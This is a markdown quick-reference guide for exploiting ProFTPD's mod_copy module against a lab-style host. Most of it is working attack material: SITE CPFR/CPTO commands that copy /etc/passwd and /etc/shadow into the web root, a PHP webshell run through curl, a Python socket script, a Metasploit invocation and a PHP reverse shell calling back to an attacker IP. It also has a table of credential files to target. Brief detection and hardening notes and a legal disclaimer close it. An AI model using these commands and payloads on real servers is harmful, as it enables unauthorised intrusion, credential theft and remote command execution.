# üéØ ProFTPD mod_copy Exploitation Quick Reference

## Quick Exploitation Commands

### 1. Basic File Reading
```bash
# Connect to FTP
nc 172.25.0.10 21

# Copy sensitive files to web directory
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

SITE CPFR /etc/shadow
SITE CPTO /var/www/html/shadow.txt

# Access via browser
http://172.25.0.10/passwd.txt
```

### 2. Webshell Upload Method
```bash
# First, create a local webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to FTP (if anonymous upload is enabled)
ftp 172.25.0.10 2121
> put shell.php

# Or copy existing PHP file and modify
SITE CPFR /usr/share/php/file.php
SITE CPTO /var/www/html/shell.php

# Execute commands
curl "http://172.25.0.10/shell.php?cmd=whoami"
curl "http://172.25.0.10/shell.php?cmd=id"
```

### 3. Python One-Liner RCE
```python
#!/usr/bin/env python
import socket

target = '172.25.0.10'
port = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)

# Copy /proc/self/cmdline to check running processes
s.send(b'SITE CPFR /proc/self/cmdline\r\n')
s.recv(1024)
s.send(b'SITE CPTO /var/www/html/cmdline.txt\r\n')
s.recv(1024)

s.close()
```

### 4. Metasploit Module
```bash
msfconsole -q
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.25.0.10
set RPORT 21
set TARGETURI /
set SITEPATH /var/www/html
run
```

### 5. Manual Reverse Shell
```bash
# Create PHP reverse shell
cat > revshell.php << 'EOF'
<?php
$ip = 'YOUR_KALI_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
EOF

# Upload and copy to web directory
# Then trigger via HTTP request while listening:
nc -lvnp 4444
```

## Common Target Files

| File Path | Information |
|-----------|------------|
| `/etc/passwd` | User accounts |
| `/etc/shadow` | Password hashes (if readable) |
| `/etc/apache2/sites-enabled/` | Web configs |
| `/var/www/html/` | Web root |
| `/home/` | User home directories |
| `/proc/self/environ` | Environment variables |
| `/proc/self/cmdline` | Current process command |
| `~/.ssh/id_rsa` | SSH private keys |
| `/var/log/apache2/access.log` | Web access logs |

## Troubleshooting

### Issue: "550 Permission denied"
**Solution**: Target directory not writable. Try `/tmp/` first:
```
SITE CPFR /etc/passwd
SITE CPTO /tmp/passwd.txt
```

### Issue: "500 Command not understood"
**Solution**: mod_copy not loaded. Check with:
```
SITE HELP
```

### Issue: Cannot access web files
**Solution**: Check web server document root:
```
SITE CPFR /etc/apache2/sites-enabled/000-default.conf
SITE CPTO /tmp/webconfig.txt
```

## Detection & Indicators

FTP logs showing these patterns indicate exploitation:
```
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/
```

## Defensive Measures

1. **Disable mod_copy**: Remove or comment out in proftpd.conf
2. **Update ProFTPD**: Upgrade to version > 1.3.5
3. **File permissions**: Restrict write access to web directories
4. **Monitoring**: Watch for SITE CPFR/CPTO commands in logs

---

‚ö†Ô∏è **Legal Notice**: Only use on systems you own or have explicit permission to test.
